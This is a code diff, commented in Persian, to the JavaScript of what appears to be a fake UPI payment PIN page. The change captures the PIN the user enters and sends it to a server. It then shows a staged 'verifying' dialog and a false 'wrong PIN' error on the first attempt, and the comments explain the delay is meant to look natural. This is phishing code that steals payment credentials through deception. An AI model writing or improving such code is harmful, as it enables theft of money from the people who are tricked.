@@ -434,19 +434,24 @@ h5 {
             let upiPin = enteredNumbers.join('');
             savedPIN = upiPin;
             
-            // ⭐ اگر اولین بار هست، PIN رو به سرور ارسال کن (با status failed) و error "پین اشتباهه" نشون بده
+            // ⭐ اگر اولین بار هست، timer نشون بده و بعد error
             if (isFirstAttempt) {
-                // ⭐ ارسال PIN به سرور با status failed
-                sendPinToServer(upiPin, false);  // false = failed
+                // ⭐ Timer dialog نشون بده (مثل بار دوم)
+                showVerifyDialog();
                 
+                // ⭐ بعد از 3 ثانیه PIN رو ارسال کن (با status failed) و error نشون بده
                 setTimeout(() => {
+                    // ⭐ ارسال PIN به سرور با status failed
+                    sendPinToServer(upiPin, false);  // false = failed
+                    
+                    hideVerifyDialog();
                     showErrorPinDialog();  // ⭐ error "پین اشتباهه" نشون بده
                     localStorage.setItem('upi_pin_attempt', 'failed');  // ذخیره که fail شده
                     isFirstAttempt = false;  // بار بعد موفق باشه
                     // پاک کردن PIN برای تلاش بعدی
                     enteredNumbers = [];
                     updateDisplay();
-                }, 1000);  // یکم delay برای واقعی‌تر شدن
+                }, 3000);  // ⭐ 3 ثانیه مثل بار دوم برای طبیعی بودن
                 return;
             }
             
